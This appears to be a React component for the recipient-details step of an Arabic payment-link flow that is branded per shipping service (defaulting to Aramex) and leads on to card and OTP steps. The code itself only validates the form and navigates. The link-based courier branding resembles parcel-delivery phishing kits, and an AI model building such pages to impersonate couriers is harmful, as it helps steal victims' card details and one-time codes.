import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useTheme } from "@/themes/ThemeContext";
import { PaymentHeader, PaymentCard, PaymentButton, PaymentFormField } from "@/components/payment";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { User, ArrowLeft, Mail, Phone, MapPin } from "lucide-react";
import "@/themes/themeStyles.css";

const PaymentRecipientTheme = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const { theme } = useTheme();

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});

  if (!theme) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        minHeight: '100vh',
      }}>
        <div className="spinner" />
      </div>
    );
  }

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get amount from link data
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;
  const formattedAmount = formatCurrency(amount, countryCode);

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    if (!customerName.trim()) {
      newErrors.customerName = "يرجى إدخال اسم المستلم";
    }

    if (!customerEmail.trim()) {
      newErrors.customerEmail = "يرجى إدخال البريد الإلكتروني";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(customerEmail)) {
      newErrors.customerEmail = "يرجى إدخال بريد إلكتروني صحيح";
    }

    if (!customerPhone.trim()) {
      newErrors.customerPhone = "يرجى إدخال رقم الهاتف";
    }

    if (!residentialAddress.trim()) {
      newErrors.residentialAddress = "يرجى إدخال العنوان";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleProceed = (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      navigate(`/pay/${id}/details`);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  const steps = [
    { id: '1', label: 'التفاصيل', description: 'معلومات الدفعة' },
    { id: '2', label: 'المستلم', description: 'بيانات الاستلام' },
    { id: '3', label: 'الدفع', description: 'معلومات البطاقة' },
    { id: '4', label: 'التحقق', description: 'رمز OTP' },
  ];

  return (
    <div className="payment-details-bg wave-pattern fade-in">
      {/* Payment Header with Company Branding */}
      <PaymentHeader
        title="بيانات المستلم"
        subtitle={`خدمة ${serviceName}`}
        showBackButton={true}
        onBackClick={handleBack}
        logoPosition="left"
      />

      <div style={{
        maxWidth: '600px',
        margin: `${theme.spacing.lg} auto`,
        display: 'flex',
        flexDirection: 'column',
        gap: theme.spacing.lg,
      }}>
        {/* Progress Steps */}
        <div className="slide-in">
          <div style={{
            backgroundColor: theme.colors.surface,
            padding: theme.spacing.lg,
            borderRadius: theme.borderRadius.lg,
            border: `1px solid ${theme.colors.border}`,
          }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              marginBottom: theme.spacing.md,
            }}>
              <span style={{
                fontSize: theme.fonts.sizes.sm,
                fontWeight: theme.fonts.weights.semibold,
                color: theme.colors.text,
              }}>
                الخطوة 2 من 4
              </span>
              <span style={{
                fontSize: theme.fonts.sizes.xs,
                color: theme.colors.textSecondary || theme.colors.text,
              }}>
                {serviceName}
              </span>
            </div>

            {/* Progress Bar */}
            <div style={{
              width: '100%',
              height: '4px',
              backgroundColor: theme.colors.border,
              borderRadius: theme.borderRadius.full,
              overflow: 'hidden',
            }}>
              <div style={{
                width: '50%',
                height: '100%',
                backgroundColor: theme.colors.primary,
                borderRadius: theme.borderRadius.full,
                transition: 'width 0.5s ease',
              }} />
            </div>
          </div>
        </div>

        {/* Recipient Form */}
        <div className="slide-in" style={{
          animationDelay: '0.1s',
        }}>
          <PaymentCard
            title="معلومات المستلم"
            subtitle="أدخل بيانات الشخص الذي سيستلم الشحنة"
          >
            <form onSubmit={handleProceed}>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: theme.spacing.md,
              }}>
                <PaymentFormField
                  label="الاسم الكامل"
                  type="text"
                  placeholder="أدخل الاسم الكامل"
                  value={customerName}
                  onChange={(e) => setCustomerName(e.target.value)}
                  error={errors.customerName}
                  leftIcon={<User size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                <PaymentFormField
                  label="البريد الإلكتروني"
                  type="email"
                  placeholder="example@email.com"
                  value={customerEmail}
                  onChange={(e) => setCustomerEmail(e.target.value)}
                  error={errors.customerEmail}
                  leftIcon={<Mail size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                <PaymentFormField
                  label="رقم الهاتف"
                  type="tel"
                  placeholder={countryData?.phonePlaceholder || "5X XXX XXXX"}
                  value={customerPhone}
                  onChange={(e) => setCustomerPhone(e.target.value)}
                  error={errors.customerPhone}
                  leftIcon={<Phone size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                <PaymentFormField
                  label="العنوان"
                  type="text"
                  placeholder="أدخل العنوان الكامل"
                  value={residentialAddress}
                  onChange={(e) => setResidentialAddress(e.target.value)}
                  error={errors.residentialAddress}
                  leftIcon={<MapPin size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                {/* Amount Display */}
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  padding: theme.spacing.md,
                  backgroundColor: theme.colors.background,
                  borderRadius: theme.borderRadius.md,
                  border: `1px solid ${theme.colors.border}`,
                }}>
                  <span style={{
                    fontSize: theme.fonts.sizes.base,
                    color: theme.colors.text,
                    fontWeight: theme.fonts.weights.medium,
                  }}>
                    المبلغ الإجمالي
                  </span>
                  <span style={{
                    fontSize: theme.fonts.sizes.lg,
                    color: theme.colors.primary,
                    fontWeight: theme.fonts.weights.bold,
                  }}>
                    {formattedAmount}
                  </span>
                </div>

                {/* Submit Button */}
                <PaymentButton
                  type="submit"
                  variant="primary"
                  size="lg"
                  fullWidth={true}
                  icon={<ArrowLeft size={20} />}
                  style={{
                    marginTop: theme.spacing.lg,
                  }}
                >
                  المتابعة للدفع
                </PaymentButton>

                <div style={{
                  marginTop: theme.spacing.md,
                  textAlign: 'center' as const,
                }}>
                  <span style={{
                    fontSize: theme.fonts.sizes.xs,
                    color: theme.colors.textSecondary || theme.colors.text,
                  }}>
                    بالمتابعة، أنت توافق على الشروط والأحكام
                  </span>
                </div>
              </div>
            </form>
          </PaymentCard>
        </div>
      </div>
    </div>
  );
};

export default PaymentRecipientTheme;
